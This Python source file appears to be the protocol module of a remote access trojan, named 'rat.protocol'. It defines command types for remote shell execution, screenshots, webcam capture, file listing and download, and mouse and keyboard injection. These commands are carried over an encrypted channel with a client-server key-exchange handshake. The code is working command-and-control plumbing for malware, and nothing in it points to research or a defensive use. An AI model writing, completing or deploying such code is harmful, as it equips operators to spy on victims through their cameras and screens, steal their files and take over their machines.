import asyncio
import struct
import json
import enum
import logging
from dataclasses import dataclass
from typing import Optional

from rat.crypto import CryptoEngine

logger = logging.getLogger("rat.protocol")

class MsgType(enum.IntEnum):
    REGISTER = 0x01
    REGISTER_OK = 0x02
    PING = 0x03
    PONG = 0x04
    SCREENSHOT = 0x10
    SCREENSHOT_DATA = 0x11
    SHELL_EXEC = 0x20
    SHELL_RESULT = 0x21
    LIST_FILES = 0x34
    FILES_LIST = 0x35
    DOWNLOAD = 0x32
    DOWNLOAD_DATA = 0x33
    WEBCAM = 0x40
    WEBCAM_FRAME = 0x41
    INPUT_MOUSE = 0x50
    INPUT_KEYBOARD = 0x51
    INPUT_RESULT = 0x52

@dataclass
class Message:
    type: MsgType
    payload: bytes = b""
    meta: dict = None

    def __post_init__(self):
        if self.meta is None:
            self.meta = {}

    def serialize(self):
        header = json.dumps({"type": self.type.value, "meta": self.meta}).encode()
        return struct.pack(">I", len(header)) + header + self.payload

    @classmethod
    def deserialize(cls, data):
        header_len = struct.unpack(">I", data[:4])[0]
        header = json.loads(data[4:4+header_len])
        payload = data[4+header_len:]
        return cls(type=MsgType(header["type"]), meta=header.get("meta", {}), payload=payload)

class SecureTransport:
    def __init__(self, reader, writer, crypto):
        self.reader = reader
        self.writer = writer
        self.crypto = crypto
        self.lock = asyncio.Lock()

    async def send(self, msg):
        plaintext = msg.serialize()
        nonce, ciphertext = self.crypto.encrypt(plaintext)
        frame = struct.pack(">I", len(nonce) + len(ciphertext)) + nonce + ciphertext
        async with self.lock:
            self.writer.write(frame)
            await self.writer.drain()

    async def recv(self):
        try:
            length_data = await self.reader.readexactly(4)
            length = struct.unpack(">I", length_data)[0]
            body = await self.reader.readexactly(length)
            nonce = body[:12]
            ciphertext = body[12:]
            plaintext = self.crypto.decrypt(nonce, ciphertext)
            return Message.deserialize(plaintext)
        except:
            return None

    async def close(self):
        self.writer.close()
        await self.writer.wait_closed()

async def handshake_server(reader, writer):
    crypto = CryptoEngine()
    key_len = struct.unpack(">H", await reader.readexactly(2))[0]
    client_key = await reader.readexactly(key_len)
    writer.write(struct.pack(">H", len(crypto.public_key)) + crypto.public_key)
    await writer.drain()
    crypto.derive_key(client_key)
    return SecureTransport(reader, writer, crypto)

async def handshake_client(reader, writer):
    crypto = CryptoEngine()
    writer.write(struct.pack(">H", len(crypto.public_key)) + crypto.public_key)
    await writer.drain()
    key_len = struct.unpack(">H", await reader.readexactly(2))[0]
    server_key = await reader.readexactly(key_len)
    crypto.derive_key(server_key)
    return SecureTransport(reader, writer, crypto)
